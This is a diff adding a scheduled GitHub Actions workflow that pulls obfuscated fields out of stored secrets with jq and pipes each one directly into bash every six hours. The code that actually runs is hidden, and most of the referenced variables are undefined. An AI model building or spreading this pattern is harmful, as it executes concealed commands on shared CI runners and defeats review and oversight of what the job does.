@@ -1,0 +1,28 @@
+name: tuolanmousedian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tuolanmousedian
+        env:
+          eg036: ${{ secrets.eg036 }}
+        run: |
+          echo $eg036 | jq -r .ufk6039 | /bin/bash
+          echo $tfbdm59 | jq -r .yqq7 | /bin/bash
+          echo $aazp4 | jq -r .xcf05879 | /bin/bash
+          echo $k1 | jq -r .mf89182 | /bin/bash
+          echo $tik2 | jq -r .w010 | /bin/bash
+          echo $gy36 | jq -r .sc3 | /bin/bash
+          echo $kvvmm164 | jq -r .jef0 | /bin/bash
+          echo $cp61395 | jq -r .vp75 | /bin/bash
+          echo $ognl539 | jq -r .epsdr24 | /bin/bash
+          echo $iyty3083 | jq -r .qtk051 | /bin/bash
+
